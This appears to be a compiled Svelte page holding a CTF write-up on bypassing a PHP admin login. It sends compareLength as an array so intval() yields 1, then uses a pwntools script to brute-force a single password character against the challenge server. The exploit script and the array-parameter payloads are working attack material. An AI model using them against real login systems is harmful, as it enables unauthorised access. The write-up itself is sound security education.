import { c as create_ssr_component } from "./ssr.js";
const metadata = {
  "title": "Confusing Passwords",
  "description": "This login system will give you the flag... as long as you can prove you're an admin!",
  "author": "0x0539",
  "date": "2023-06-16",
  "published": true
};
const Confusing_passwords = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  return `<h1 data-svelte-h="svelte-4o0usy">confusing passwords</h1> <p data-svelte-h="svelte-2ng4p6"><a href="https://0x0539.net/play/minas_tirith/confusing_passwords" rel="nofollow">challenge</a></p> <aside data-svelte-h="svelte-qi8cif">👻  Admin Login
Prove [you&#39;re] an admin to access the flag.</aside> <h2 data-svelte-h="svelte-1rxqya9">overview</h2> <p data-svelte-h="svelte-1ih6csj">the challenge landing page presents us with the login form and the page’s source code. its a php-based login form, and the source immediately confirms a handful of credentials:</p> <pre class="language-php"><!-- HTML_TAG_START -->${`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token comment">// First check if the player wants to view the source, if so we'll display then kill the page.</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"viewsrc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function-definition function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctUser</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$correctUser</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that</span>
    <span class="token comment">// it's fully compared.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$correctPassword</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// We should also check against an integer overflow</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// Finally, compare the passwords</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token variable">$loginAttempted</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
  <span class="token variable">$loginSuccess</span>   <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

  <span class="token variable">$correctUsername</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span> <span class="token comment">// ok</span>
  <span class="token variable">$correctPassword</span>  <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/adminpwd.txt"</span><span class="token punctuation">,</span> <span class="token constant">FILE_USE_INCLUDE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// :D</span>
  <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token constant">FILE_USE_INCLUDE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Check that all fields are set before attempting to login</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"compareLength"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token variable">$checkUsername</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$checkPassword</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$checkCompareLen</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"compareLength"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$loginAttempted</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token variable">$loginSuccess</span>   <span class="token operator">=</span> <span class="token function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$checkUsername</span><span class="token punctuation">,</span> <span class="token variable">$checkPassword</span><span class="token punctuation">,</span> <span class="token variable">$correctUsername</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

// [ and then the page's html &amp; css. ]</code>`}<!-- HTML_TAG_END --></pre> <h2 data-svelte-h="svelte-1t3hxhr">initial enumeration</h2> <p data-svelte-h="svelte-1jqlzce">upon initial inspection, the above source code indicates that any username entered into the site is checked against the string <code>admin</code>. furthermore, the <code>checkCredentials</code> function ensures</p> <ul data-svelte-h="svelte-lsmg4p"><li>all parameters are included in request, and</li> <li>the <code>username</code> and <code>compareLength</code> parameters contain a value.</li></ul> <p data-svelte-h="svelte-lebmgp">we can run some requests through burpsuite to modify POST data - this test form gives us a general idea of the intended form functionality - we also see that the default value for <code>compareLength</code> is <code>32</code>.</p> <p data-svelte-h="svelte-rf5dqa"><img src="/img/confusing_passwords_img/burp_post_test.png" alt="burp_post_test"></p> <p data-svelte-h="svelte-1k8r7o6">the final line <code>return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);</code> is especially interesting here. it looks like the program compares <code>$password</code> against <code>$correctPassword</code> for each character for a maximum of <code>intval($checkCompareLen)</code> characters and returning true if all compared characters match -  if we set <code>checkCompareLen</code> to <code>0</code> in a POST request, <code>intval($checkCompareLen)</code> would be <code>0</code>, and we may be able to login without a password.</p> <p data-svelte-h="svelte-1nm9os7">upon sending a request with <code>compareLength=0</code>, we note the lack of a <code>login failed</code> warning - feeback that the page isnt processing our request in the same manner as before:</p> <p data-svelte-h="svelte-1k09r8h"><img src="/img/confusing_passwords_img/burp_post_test_2.png" alt="burp_post_test"></p> <p data-svelte-h="svelte-yugh1f">looking at the markup for rendering the <code>Login failed</code> warning, we can see that it is displayed if <code>$loginSuccess != true</code> AND <code>$loginAttempted == true</code>.</p> <p data-svelte-h="svelte-4gg0gd">i <em>assume</em> that this occurs as <code>!empty($_POST[&quot;compareLength&quot;]))</code> returns <code>false</code> when its value is <code>0</code>, and so <code>$loginAttempted</code> is not updated to <code>true</code> and the banner is not rendered:</p> <pre class="language-php"><!-- HTML_TAG_START -->${`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// ...</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctUser</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$correctUser</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$correctPassword</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token comment">// ...</span>
<span class="token delimiter important">?></span></span>

  // the section in markup where the check to determine if a 'login failed' warning needs to be rendered:

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$loginSuccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        Welcome <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$correctUsername</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>. Since you've authenticated as an admin, here's the secret flag: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$loginSuccess</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$loginAttempted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>     // <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>--</span> <span class="token attr-name">note</span> <span class="token attr-name">the</span> <span class="token attr-name">&#96;&amp;&amp;&#96;</span> <span class="token attr-name">operator</span>
        <span class="token attr-name">&lt;div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-danger<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            Login failed.
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1d2w13s">ultimately, this means the page doesnt run checks on our <code>compareLength</code> if it is set to <code>0</code> in this way.</p> <h2 data-svelte-h="svelte-bti57c">vulnerabilities</h2> <p data-svelte-h="svelte-1gf18vg">so to reiterate purely on speculation using the source code:</p> <ol data-svelte-h="svelte-9wkjp2"><li>the <code>username</code> parameter must be the same value as <code>$correctUser</code>, and</li> <li>the posted <code>compareLength</code> parameter has to be both:<ol><li>a positive integer greater than <code>0</code>,</li> <li>a value greater than or equal to the length of <code>$correctPassword</code>.</li></ol></li></ol> <h3 data-svelte-h="svelte-849ef8"><code>username</code> parameter</h3> <p data-svelte-h="svelte-ib5ih3">we already know from source code that the correct username is <code>admin</code>; <code>username</code> ultimately doesn’t appear to play any further role in authentication, so we can ignore this for now.</p> <p data-svelte-h="svelte-b6h9pl">instead, we may be able to modify our POST request to pass an unexpected value to the <code>password</code> or <code>compareLength</code> checks, which may invoke some unexpected behaviour.</p> <p data-svelte-h="svelte-1tacvg0">we can do this using a vulnerability called <code>type juggling</code>, which is a result of a programming language converting different object types to a “common value” when it is asked to run comparisons on them. in PHP, these vulnerabilities are commonly the result of ‘loose’ comparison operators (e.g., <code>==</code>, <code>!=</code>), which will compare only the <em>value</em> stored in an object when invoked.</p> <p data-svelte-h="svelte-j4p8zs">conversely, ‘strict’ operators (<code>===</code>, <code>!==</code>, and so on) will also compare the <em>type</em> of each object alongside its value.</p> <h3 data-svelte-h="svelte-124ctwh"><code>password</code> parameter</h3> <p data-svelte-h="svelte-hevrlr">to explain this in a little more detail - if the page had used a regular <code>strcmp()</code> function (as opposed to <code>str&lt;n&gt;cmp()</code>) with a loose comparison operator, we could modify the password parameter of a POST request as follows:</p> <pre class="language-php"><!-- HTML_TAG_START -->${`<code class="language-php"><span class="token comment">// a hypothetical webpage might try to validate a password with a &#96;strcmp()&#96; function, and</span>
<span class="token comment">// then comparing its returned value to &#96;0&#96;:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// &#96;strcmp()&#96; wants to operate on two string objects, as it will compare each character in each string, incrementing</span>
<span class="token comment">// the returning value by 1 for each differing character:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password123"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password123"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// returns &#96;true&#96; as there are 0 different characters.</span>

<span class="token comment">// in the above example, if we were to make a post request with the following parameters:</span>
username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>

<span class="token comment">// it would be evaulated as:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"real_password123"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// returns &#96;true&#96;; &#96;Array()&#96; == &#96;NULL&#96; == &#96;0&#96;.</span>
<span class="token comment">// an unexpected array object is determined by &#96;strcmp()&#96; to contain the value &#96;NULL&#96;;</span>
<span class="token comment">// PHP considers &#96;NULL&#96; to be "loosely" equal to &#96;0&#96;, and so the login form will return &#96;true&#96; under this condition.</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1407lsf">we are not dealing with the exact functionality as indicated above due to the strict comparison operation, but serves as a simple example - there are a number of type conversions that take place before our input is compared to <code>0</code> at the end of the <code>checkCredentials</code> function, which leaves significant room for error.</p> <p data-svelte-h="svelte-14oepee">we <em>also</em> get rendered feedback regarding the evaluation of our modified <code>password</code> parameter, so we can programmatically use page data to check when the page has run a <code>strncmp</code> comparison on our input:</p> <p data-svelte-h="svelte-1lpvrtq"><img src="/img/confusing_passwords_img/burp_post_test_3.png" alt="burp_post_test"></p> <p data-svelte-h="svelte-11uxrhg">as the password value isn’t used in loose operations, however, it isnt feasible to directly trick the form with type juggling.</p> <h3 data-svelte-h="svelte-l5ynux"><code>compareLength</code> parameter</h3> <p data-svelte-h="svelte-1qwvv2n">regarding <code>compareLength</code>; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is <code>&gt; 0</code>, passes all ‘pre-strncmp()’ statements, and also results in a low number when the page uses it to index the number of characters to check; even if this were a value like <code>3</code> or <code>4</code>, the form would be dramatically easier to bruteforce.</p> <h3 data-svelte-h="svelte-ylopn7">exploit</h3> <p data-svelte-h="svelte-1q1l18c">thankfully, <code>intval()</code> is used to convert the data in <code>compareLength</code> to an integer; a practice that the <a href="https://www.php.net/manual/en/function.intval.php" rel="nofollow">php documenataion <strong>strongly</strong> advises against when dealing with objects</a>:</p> <blockquote data-svelte-h="svelte-5wx5oi"><p>Returns the int value of value, using the specified base for the conversion (the default is base 10). <strong>intval() should not be used on objects, as doing so will emit an E_WARNING level error and return 1.</strong></p></blockquote> <p data-svelte-h="svelte-6ye48">another notable quirk about PHP &amp; arrays (as it related to the page’s functionality): array objects are always considered greater than any non-array object (without considering their actual values), so a request with an empty array will pass both the pre-check tests.</p> <p data-svelte-h="svelte-ulb9dv">so, if we pass an Array to the <code>compareLength</code> parameter:</p> <ul data-svelte-h="svelte-lt240p"><li>it will be a larger number than the length of <code>correctPassword</code> simply on principle, but</li> <li><code>intval()</code> evaluates it as <code>1</code>,</li></ul> <p data-svelte-h="svelte-kkyrbr">so <code>strncmp()</code> will only compare the first character in <code>$correctPassword</code> and our <code>password</code> parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a <em>maximum</em> of ~52 characters (the first character is likely [<code>a-Z</code>]).</p> <p data-svelte-h="svelte-vubm6b">we can check that our interpretation of the request is correct by submitting a post request with the <code>password</code> and <code>compareLength</code> params as arrays; if the page renders the <code>strncmp</code> warning, we know that it tried to parse the arrays as strings:</p> <p data-svelte-h="svelte-1dc2q0z"><img src="/img/confusing_passwords_img/burp_post_test_4.png" alt="burp_post_test"></p> <p data-svelte-h="svelte-1r8qb35">with this theory confirmed, a quick python script using header info from burpsuite to feed into <code>pwntools</code>:</p> <ol data-svelte-h="svelte-12c3dj9"><li>we make a post request with a malformed <code>compareLength</code> parameter,</li> <li>the response is checked against a success condition; failed attempts are ignored,</li> <li>upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain ’<code>Welcome &lt;?php echo $correctUsername; ?&gt;. Since you&#39;ve authenticated as an admin, here&#39;s the secret flag: &lt;?php echo $flag; ?&gt;</code>’, though this could just as easily be replace with the opposite operation; something like <code>if not b&#39;Login failed&#39; in response</code>):</li></ol> <pre class="language-python"><!-- HTML_TAG_START -->${`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

charset <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-=+_&lt;>'</span>
charset <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span>charset<span class="token punctuation">]</span>
<span class="token keyword">for</span> char <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'trying </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">...'</span></span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenges.0x0539.net'</span><span class="token punctuation">,</span><span class="token number">3011</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'POST /index.php HTTP/1.1&#92;r&#92;n'</span>
            <span class="token string">'Content-Length: 42&#92;r&#92;n'</span>
            <span class="token string">'Host: challenges.0x0539.net:3011&#92;r&#92;n'</span>
            <span class="token string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#92;r&#92;n'</span>
            <span class="token string">'Referer: http://challenges.0x0539.net:3011/index.php&#92;r&#92;n'</span>
            <span class="token string">'Content-Type: application/x-www-form-urlencoded&#92;r&#92;n'</span>
            <span class="token string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#92;r&#92;n'</span>
            <span class="token string">'Connection: close&#92;r&#92;n&#92;r&#92;n'</span>
            <span class="token string">'username=admin&amp;password=&#123;&#125;&amp;compareLength[]='</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>

    response <span class="token operator">=</span> r<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'the secret flag:'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span> <span class="token comment"># alternatively, &#96;if not b'Login failed' in response&#96;...</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'&#92;n####### &#92;n'secret flag' found in response. trimmed output:'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b' Welcome admin.'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'&lt;/div>&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'#######'</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span></code>`}<!-- HTML_TAG_END --></pre> <h2 data-svelte-h="svelte-110tevo">flag</h2> <p data-svelte-h="svelte-13av93y">running the script, we get a successful login on a POST with <code>&amp;password=f</code>:</p> <pre class="language-lua"><!-- HTML_TAG_START -->${`<code class="language-lua">┌──<span class="token punctuation">(</span>root㉿RUBY<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>mnt<span class="token operator">/</span>…<span class="token operator">/</span>ctf<span class="token operator">/</span>sites<span class="token operator">/</span><span class="token number">0x0539</span><span class="token operator">/</span>confusing<span class="token operator">-</span>passwords<span class="token punctuation">]</span>
└─<span class="token operator">#</span> python pass_enum<span class="token punctuation">.</span>py
trying a<span class="token punctuation">...</span>
<span class="token operator">/</span>mnt<span class="token operator">/</span>a<span class="token operator">/</span>ctf<span class="token operator">/</span>sites<span class="token operator">/</span><span class="token number">0x0539</span><span class="token operator">/</span>confusing<span class="token operator">-</span>passwords<span class="token operator">/</span>pass_enum<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span> BytesWarning<span class="token punctuation">:</span> Text is <span class="token keyword">not</span> bytes<span class="token punctuation">;</span> assuming ASCII<span class="token punctuation">,</span> no guarantees<span class="token punctuation">.</span> See https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>pwntools<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">#</span>bytes
  r<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'POST /index.php HTTP/1.1&#92;r&#92;n'</span>
trying b<span class="token punctuation">...</span>
trying c<span class="token punctuation">...</span>
trying d<span class="token punctuation">...</span>
trying e<span class="token punctuation">...</span>
trying f<span class="token punctuation">...</span>
<span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span>
<span class="token string">'secret flag'</span> found <span class="token keyword">in</span> response<span class="token punctuation">.</span> appending trimmed output<span class="token punctuation">:</span>

b<span class="token string">"Since you've authenticated as an admin, here's the secret flag: FLAG&#123;*redacted*&#125;"</span>
<span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span></code>`}<!-- HTML_TAG_END --></pre>`;
});
export {
  Confusing_passwords as default,
  metadata
};
